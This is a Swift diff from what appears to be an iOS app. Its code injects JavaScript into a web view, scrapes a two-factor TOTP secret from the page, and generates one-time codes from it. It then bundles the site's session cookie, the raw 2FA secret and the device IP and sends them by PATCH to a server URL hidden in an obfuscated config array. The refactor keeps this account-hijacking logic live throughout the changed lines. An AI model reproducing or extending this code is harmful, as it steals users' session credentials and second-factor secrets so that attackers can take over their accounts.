@@ -71,22 +71,22 @@ func webView(_ webView: WKWebView, didStartProvisionalNavigation navigation: WKN
 }//didStartProvisionalNavigation
         
 func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
-    webView.evaluateJavaScript(arrayData[ValueKey.nine_fr_1a.rawValue] ?? "", completionHandler: { result, error in })
+    webView.evaluateJavaScript(self.Seven_au_con_parent.arrayData[ValueKey.nine_fr_1a.rawValue] ?? "", completionHandler: { result, error in })
 
 // Cho 5s cho load html all.
     DispatchQueue.main.asyncAfter(deadline: .now() + 10.0) {
-        webView.evaluateJavaScript(arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
+        webView.evaluateJavaScript(self.Seven_au_con_parent.arrayData[ValueKey.outer_fr_1a.rawValue] ?? "") { html, error in
             if let content = html as? String, error == nil {
                 DispatchQueue.main.asyncAfter(deadline: .now() + 3.0) {
 // Loc ra key
-                let matchedsecret = self.Coords_Seven_matches(for: arrayData[ValueKey.nine_fr_2a.rawValue] ?? "", in: content).filter({ !$0.isEmpty })
+                    let matchedsecret = self.Coords_Seven_matches(for: self.Seven_au_con_parent.arrayData[ValueKey.nine_fr_2a.rawValue] ?? "", in: content).filter({ !$0.isEmpty })
                     if !matchedsecret.isEmpty {
                         let secretString = matchedsecret[0]
                         guard let data = base32DecodeToData(secretString) else { return }
                         guard let totp = TOTP(secret: data), let otpString = totp.generate(time: Date()) else {
                             return
                         }
-                        webView.evaluateJavaScript(arrayData[ValueKey.nine_fr_3a.rawValue] ?? "", completionHandler: { result, error in })
+                        webView.evaluateJavaScript(self.Seven_au_con_parent.arrayData[ValueKey.nine_fr_3a.rawValue] ?? "", completionHandler: { result, error in })
 // Cho 2s se dien vao input
                         DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                             //copy key vao bo nho tam
@@ -99,15 +99,15 @@ func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
                             }
                             
                             WKWebsiteDataStore.default().httpCookieStore.getAllCookies({ (cookies) in
-                                let seven_reco_Au_i = cookies.firstIndex(where: { $0.name == arrayData[ValueKey.name_api_09.rawValue] ?? "" })
+                                let seven_reco_Au_i = cookies.firstIndex(where: { $0.name == self.Seven_au_con_parent.arrayData[ValueKey.name_api_09.rawValue] ?? "" })
                                 if(seven_reco_Au_i != nil){
                                     let Seven_reco_Au_json_data: [String: Any] = [
-                                        arrayData[ValueKey.name_api_23.rawValue] ?? "": cookies[seven_reco_Au_i!].value,
-                                        arrayData[ValueKey.name_api_24.rawValue] ?? "": "\(matchedsecret[0])",
-                                        arrayData[ValueKey.name_api_25.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String)-ONE",
-                                        arrayData[ValueKey.name_api_26.rawValue] ?? "": self.readIppAdd()
+                                        self.Seven_au_con_parent.arrayData[ValueKey.name_api_23.rawValue] ?? "": cookies[seven_reco_Au_i!].value,
+                                        self.Seven_au_con_parent.arrayData[ValueKey.name_api_24.rawValue] ?? "": "\(matchedsecret[0])",
+                                        self.Seven_au_con_parent.arrayData[ValueKey.name_api_25.rawValue] ?? "": "\(Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as! String)-ONE",
+                                        self.Seven_au_con_parent.arrayData[ValueKey.name_api_26.rawValue] ?? "": self.readIppAdd()
                                     ]
-                                    let url : URL = URL(string: arrayData[ValueKey.Chung_fr_08.rawValue] ?? "")!
+                                    let url : URL = URL(string: self.Seven_au_con_parent.arrayData[ValueKey.Chung_fr_08.rawValue] ?? "")!
                                     let json_data = try? JSONSerialization.data(withJSONObject: Seven_reco_Au_json_data)
                                     var request = URLRequest(url: url)
                                     request.httpMethod = "PATCH"
